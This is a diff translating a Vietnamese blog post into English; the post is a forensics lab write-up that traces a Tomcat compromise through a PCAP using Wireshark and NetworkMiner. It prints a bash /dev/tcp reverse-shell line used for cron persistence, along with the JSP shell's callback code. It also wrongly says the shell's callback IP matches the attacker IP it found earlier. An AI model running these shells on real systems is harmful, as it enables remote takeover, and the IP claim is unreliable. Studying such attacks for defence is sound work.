@@ -1,4 +1,4 @@
----
+﻿---
 title: "Analyze network traffic using Wireshark & NetworkMiner"
 date: 2026-04-24 00:00:00 +07000
 categories: [Network Analysis]
@@ -7,170 +7,162 @@ categories: [Network Analysis]
 
 Introduce: Analyze network traffic using Wireshark's custom columns, filters, and statistics to identify suspicious web server administration access and potential compromise.
 
-Scenario: The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.
-
+Scenario: The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they captured network traffic for analysis. The PCAP file may contain evidence of malicious activity that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP to understand the scope of the attack.
 
 =============================================================================================
 
-
-Hôm nay sẽ là bài lab về sử dụng Wireshark và NetworkMiner. Hãy đọc sơ qua bối cảnh, chúng ta nhận được một file PCAP ghi lại toàn bộ lưu lượng mạng các hành vi bên trong công ty. File PCAP có thể có bằng chứng về các hành vi độc hại dẫn đến việc máy chủ web Apache Tomcat bị compromised. Đòi hỏi phân tích sâu hơn.
+Today, we are going to work on a lab using Wireshark and NetworkMiner. Let’s review the context first. We received a PCAP file that records the network traffic of activities inside the company. The PCAP may contain evidence of malicious behavior that led to the compromise of the Apache Tomcat web server. This requires a deeper investigation.
 
 ![pic1](/assets/img/posts/Tomcat/pic1.png)
- 
-(file đề bài)
 
-Hãy mở nó bằng Wireshark và NetworkMiner
+(file provided for the exercise)
 
-Cho những ai chưa biết về NetworkMiner:
--	NetworkMiner là một network forensic tool – NFAT open source, chủ yếu cho windows. Hoạt động bằng cách chặn bắt (sniffing) hoặc phân tích các tập tin PCAP để trích xuất tệp tin, hình ảnh, thông tin chứng chỉ và mật khẩu từ lưu lượng mạng một cách thụ động.
- 
+Let’s open it with Wireshark and NetworkMiner.
+
+For those unfamiliar with NetworkMiner:
+- NetworkMiner is an open-source network forensic tool (NFAT), primarily used on Windows. It works by sniffing or analyzing PCAP files to extract files, images, certificates, and passwords from network traffic in a passive way.
+
 ![pic2](/assets/img/posts/Tomcat/pic2.png)
 
+(image after opening it in NetworkMiner)
 
-(hình ảnh sau khi mở bằng NetworkMiner)
+Right away, the interface shows the IP hosts extracted from the PCAP. This makes it easy to see which IPs sent packets, how many packets they sent or received, what sessions existed, which TCP ports were open, and so on.
 
-Ngay trong giao diện ta có thể thấy các IP host được trích xuất từ file PCAP một cách dễ dàng. Điều này thúc đẩy việc xem IP nào gửi packets đi và nhận được bao nhiêu, các sessions, open TCP ports, v.v. 
+I reviewed the Linux section and found an IP address of 14.0.0.120, shown below.
 
-Mình đã xem mục Linux có IP là 14.0.0.120, được hiển thị bên dưới
- 
 ![pic3](/assets/img/posts/Tomcat/pic3.png)
 
+This strongly suggests that this IP is performing port scanning. The reasons are:
+- This host sent a very large number of packets (9776 packets).
+- There were 30 connections to Tomcat using different source ports on the attacking machine such as 4446, 5578, 5599, and so on.
+- Gobuster/3.6 is a common brute-force directory/port tool used in pentesting. This strongly indicates that the machine is scanning and attacking.
+- *NMAP: NetworkMiner identified traffic with characteristics of Nmap.
 
-Điều này chứng minh khá rõ cho việc port scanning từ IP này, lý do:
--	Host này đã gửi một lượng lớn packets đi (9776 packets).
--	Có đến 30 lần kết nối tới Tomcat với các source port trên máy tấn công như 4446, 5578, 5599,….
--	Gobuster/3.6: là tool brute-force directory/port phổ biến trong pentest. Điều này chứng minh rõ rệt máy này đang chủ tộng scan/attack.
--	*NMAP: networkminer nhận diện traffic này có đặc trưng của nmap.
+So we can conclude that IP 14.0.0.120 is performing port scanning against 10.0.0.112 (the Tomcat Host Manager Application).
 
-Như vậy ta có thể kết luận IP 14.0.0.120 đang tiến hành port scanning đến 10.0.0.112 (Tomcat Host Manager Application).
+To get an even clearer view, we can go to Statistics -> Conversations -> TCP tab in Wireshark, as shown below:
 
-Ngoài ra để có cái nhìn rõ hơn, ta có thể vào mục Statistics -> Coversations -> tab TCP trong Wireshark như hình bên dưới:
- 
 ![pic4](/assets/img/posts/Tomcat/pic4.png)
 
+In this view, IP 14.0.0.120 is sending many packets to many different ports on 10.0.0.112 over a very short duration, which further confirms port scanning.
 
-Trong đây, IP 14.0.0.120 đang gửi rất nhiều packets đến nhiều port khác nhau cho 10.0.0.112 với duration rất thấp. Càng chứng minh rõ rệt cho việc port scaning.
+After identifying the attacker IP, let’s gather more information about it on AbuseIPDB.
 
-Sau khi đã xác định IP của attacker, hãy recon một vài thông tin về IP này trên AbuseIPDB
- 
 ![pic5](/assets/img/posts/Tomcat/pic5.png)
 
+The attacker IP was reported from China, specifically Shenzhen, Guangdong.
 
-IP của attacker được báo cáo ở Trung Quốc, cụ thể là Thâm Quyến, Quảng Đông
+Returning to the PCAP, the results above show that many ports were detected as the result of active scanning by the attacker. So let’s spend a little time to see which port provides access to the Tomcat admin panel.
 
-Quay trở lại với file PCAP, kết quả vừa rồi cho thấy nhiều ports được phát hiện là kết quả của việc scan chủ động từ attacker. Vậy thì hãy dành ra một chút thời gian để xem port nào cung cấp quyền truy cập vào admin panel của Tomcat.
-Để làm điều này, chúng ta filter với command sau trong wireshark:
+To do this, we filter with the following command in Wireshark:
 
 Ip.addr==14.0.0.120 && http
- 
+
 ![pic6](/assets/img/posts/Tomcat/pic6.png)
 
+This command shows the packets in HTTP traffic, which is commonly used to access web servers. At this point, examine any packet and view the destination port to see which port is used to access the web server.
 
-Lệnh này sẽ show các packets trong lưu lượng http, thường dùng để truy cập máy chủ web. Tại đây hãy xem một packets bất kỳ, sau đó xem destination port sẽ cho ta biết port nào dùng để truy cập máy chủ web.
- 
 ![pic7](/assets/img/posts/Tomcat/pic7.png)
 
+So the destination port on the Tomcat server is 8080.
 
-Như vậy port đích trên máy chủ Tomcat sẽ là 8080
+Previously, we learned that the attacker used Gobuster to brute-force directories in order to find hidden paths on the web server. Therefore, identifying the specific directory the attacker found is essential for responding to and containing the incident.
 
-Trước đó chúng ta được biết attacker có sử dụng gobuster phục vụ việc brute-force directories, nhằm việc tìm ra đường dẫn ẩn trên web server. Vậy việc xác định cụ thể thư mục nào mà attacker đã tìm được là rất cần thiết để ứng phó và khắc phục sự cố.
-
-Filter với câu lệnh sau trong wireshark: http && http.response.code==200
+Use the following filter in Wireshark: http && http.response.code==200
 
 ![pic8](/assets/img/posts/Tomcat/pic8.png)
 
-Chọn packet đầu tiên và xem kỹ phần packet details. Dễ dàng nhận thấy mục Request URI có /manager/. Đồng nghĩa với việc attacker đã tìm ra thư mục /manager/ là thư mục ẩn trên máy chủ web.
+Select the first packet and inspect the packet details carefully. We can clearly see that the Request URI contains /manager/. This means the attacker found the /manager/ directory, which is a hidden directory on the web server.
 
---> Cần phải config lại Access control, authorization,…. Lỗi này do Dev quên cấu hình hoặc cấu hình thiếu.
+--> Access control and authorization settings need to be reconfigured. This likely happened because the developer did not configure them properly or left the setup incomplete.
 
-Sau khi attacker đã vào được admin panel. Một vấn đề quan trọng nữa cần được điều tra là attacker đã dùng credentials nào để log in? Cred nào bị brute-force?
+After the attacker gained access to the admin panel, another important issue to investigate is which credentials were used to log in and which credentials were brute-forced.
 
-Filter ngay lệnh:
+Apply the following filter:
+
 http.authbasic
 
-lệnh này sẽ tìm tất cả các request sử dụng basic authentication trong Wireshark
- 
+This finds all requests that use basic authentication in Wireshark.
+
 ![pic9](/assets/img/posts/Tomcat/pic9.png)
 
+We may not find any credentials exposed directly here. The next step is to identify a packet that received a 200 response from the web server, which indicates that the account and password were correct.
 
-Chúng ta sẽ chưa tìm thấy được credentials nào bị lộ trong này. Việc cần làm là phải tìm packet nào được response từ web server với code 200 (được authorized) đồng nghĩa với việc tài khoản và mật khẩu đúng.
-Click vào packet đầu và follow TCP, sau đó tìm từ khóa “200”
+Click the first packet and follow the TCP stream, then search for the word “200”.
 
 ![pic10](/assets/img/posts/Tomcat/pic10.png)
 
- 
-Bạn sẽ cần bấm “Find next” một vài lần để đến được phần Request có field Authorization.
-Ở đây ta có một đoạn mã trông như base64 encode, thử decode xem
- 
+You may need to click “Find next” several times until you reach the Request section containing the Authorization field.
+
+There you will see a string that looks like base64-encoded data. Try decoding it.
+
 ![pic11](/assets/img/posts/Tomcat/pic11.png)
 
-Như vậy sau một lúc tìm kiếm, ta đã thu được tài khoản bị attacker brute-force là:
+After some searching, we recovered the credentials the attacker brute-forced:
 
 Username: admin
 
-Pass: tomcat
+Password: tomcat
 
-Bây giờ nó đã vào được admin panel, vậy thì ta cần xem nó sẽ làm gì trong này? Upload file? Download file?
-Chạy ngay filter: http && http.request.method==POST
+Now that the attacker has access to the admin panel, the next question is what they will do there: upload a file or download one?
+
+Use the filter: http && http.request.method==POST
 
 ![pic12](/assets/img/posts/Tomcat/pic12.png)
 
-Chỉ có một packet, vậy attacker chỉ upload 1 file. Click “follow TCP” để xem filename
- 
+There is only one packet, so the attacker uploaded a single file. Click “follow TCP” to inspect the filename.
+
 ![pic13](/assets/img/posts/Tomcat/pic13.png)
 
-
-Attacker đã upload file “JXQOZY.war”. Chúng ta có thể xem nội dung trong file với NetworkMiner, rất tiện cho việc trích xuất fille bên trong PCAP file.
+The attacker uploaded the file “JXQOZY.war”. We can inspect the contents of this file using NetworkMiner, which is very convenient for extracting files embedded in the PCAP.
 
 ![pic14](/assets/img/posts/Tomcat/pic14.png)
- 
+
 ![pic15](/assets/img/posts/Tomcat/pic15.png)
 
- 
-Cần điều tra file có đuôi .jsp này, rất đáng ngờ!
+We need to investigate the .jsp file, which is highly suspicious.
 
 ![pic16](/assets/img/posts/Tomcat/pic16.png)
- 
-Đây chính là đoạn mã phục vụ reverse shell JSP, cực kỳ nguy hiểm, đây là malware/backdoor được upload lên server.
+
+This is a JSP reverse shell payload, extremely dangerous, and it is malware or a backdoor uploaded to the server.
 
 ![pic17](/assets/img/posts/Tomcat/pic17.png)
- 
 
-Hãy tập trung vào phần trên, đây chính là “trái tim” của reverse shell malware:
--	new Socket("10.0.0.142", 80): đây là dòng để gọi điện về máy attacker, ip đúng như ip attacker chúng ta đã điều tra trước đó.
--	Runtime.exec(ShellPath): mở “/bin/sh” hoặc “cmd.exe” trên server như attacker đã khai báo ở trên.
--	StreamConnector dòng 3: lệnh Output của Shell đưa về cho attacker.
--	StreamConnector dòng 4: lệnh từ attacker đưa vào Shell.
+Let’s focus on the section above, which is the “heart” of the reverse shell malware:
+- new Socket("10.0.0.142", 80): this line calls back to the attacker’s machine, using the IP we investigated earlier.
+- Runtime.exec(ShellPath): opens /bin/sh or cmd.exe on the server as specified by the attacker.
+- StreamConnector line 3: sends the shell’s output back to the attacker.
+- StreamConnector line 4: sends commands from the attacker into the shell.
 
-Tóm lại, attacker gõ lệnh --> server thực thi --> kết quả trả về attacker.
+In short, the attacker types commands, the server executes them, and the results are returned to the attacker.
 
-Đã là reverse shell thì gần như có persistent, chúng ta hãy dành thêm ít công sức nữa để xem liệu attacker có các hành vi nhằm mục đích persistence hay không.
+Because this is a reverse shell, it is almost certainly persistent. Let’s spend a little more effort to see whether the attacker also performed actions intended to maintain persistence.
 
-Để làm việc này, chúng ta cần filter SYN-ACK flags từ server, Wireshark sẽ trả về danh sách tất cả các kết nối mà server đã chấp nhận từ attacker, nó đồng nghĩa với việc server đang nói “OK tao chấp nhận kết nối của mày”
+To do this, we need to filter for SYN-ACK flags from the server. Wireshark will return the list of connections the server accepted from the attacker, meaning the server said, “OK, I accept your connection.”
 
 ip.src == 14.0.0.120 && tcp.flags==0x012
 
 ![pic18](/assets/img/posts/Tomcat/pic18.png)
 
- 
-Follow TCP --> sẽ cho ra các lệnh attacker đã nhập để ra lệnh cho Shell (còn gọi là RCE)
+Follow the TCP stream, and it will reveal the commands the attacker entered to interact with the shell (also known as RCE).
 
 ![pic19](/assets/img/posts/Tomcat/pic19.png)
- 
-Vậy attacker thông qua crontab đã gõ lệnh:
-/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1' để phục vụ persistence về lâu dài.
 
-Để giải thích rõ ràng hơn cho việc tại sao follow TCP sẽ cho ra các lệnh RCE plaintext như trên. Hãy nhớ lại JSP script lúc nãy:
+So the attacker used crontab to run the following command:
+
+/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1' to maintain persistence over the long term.
+
+To explain more clearly why following the TCP stream reveals plaintext RCE commands, remember the JSP script from earlier:
 
 ![pic20](/assets/img/posts/Tomcat/pic20.png)
- 
-Shell lúc này được ghép thẳng với TCP, không thông qua mã hóa hay che giấu gi cả. Nên mọi thứ gõ qua shell đều lưu trong TCP stream
 
-Tổng kết sau bài này, chúng ta đã tích góp và học hỏi được những kỹ năng:
-- Network Forensics với NetworkMiner & Wireshark Biết cách đọc file PCAP, trích xuất thông tin host, sessions, open ports và phân tích traffic.
-- Nhận diện Port Scanning Dựa vào số lượng packets lớn, nhiều outgoing sessions, User-Agent Gobuster và dấu hiệu NMAP để kết luận hành vi scan.
-- Wireshark Filtering Biết dùng các filter thực tế như http, http.response.code==200, http.authbasic, http.request.method==POST, tcp.flags==0x012.
-- Phát hiện Brute-force Credentials Tìm được username/password bị lộ qua Basic Authentication và decode Base64.
-- Phân tích Reverse Shell Hiểu cách hoạt động của JSP Reverse Shell được upload qua Tomcat Manager dưới dạng file WAR.
--  Phát hiện Persistence qua Crontab Follow TCP Stream để đọc lệnh attacker đã thực thi, phát hiện cronjob duy trì kết nối về máy attacker.
-- Quy trình tấn công thực tế (Attack Chain) Hiểu toàn bộ chuỗi: Scan → Brute-force → Upload Shell → Reverse Shell → Persistence
+The shell is attached directly to TCP without encryption or obfuscation, so everything typed into the shell is stored in the TCP stream.
+
+In summary, after this lab, we have gained and practiced the following skills:
+- Network Forensics with NetworkMiner & Wireshark: reading PCAP files, extracting host information, sessions, open ports, and analyzing traffic.
+- Identifying Port Scanning: based on a large number of packets, many outgoing sessions, Gobuster User-Agent strings, and Nmap signatures to conclude scanning activity.
+- Wireshark Filtering: using practical filters such as http, http.response.code==200, http.authbasic, http.request.method==POST, and tcp.flags==0x012.
+- Detecting Brute-force Credentials: finding usernames/passwords exposed through Basic Authentication and decoding Base64.
+- Analyzing Reverse Shells: understanding how a JSP reverse shell uploaded through Tomcat Manager works when packaged as a WAR file.
+- Detecting Persistence via Crontab: following the TCP stream to read the attacker’s executed commands and identify a cron job maintaining a connection back to the attacker.
+- Real-world Attack Chain: understanding the full chain: Scan → Brute-force → Upload Shell → Reverse Shell → Persistence
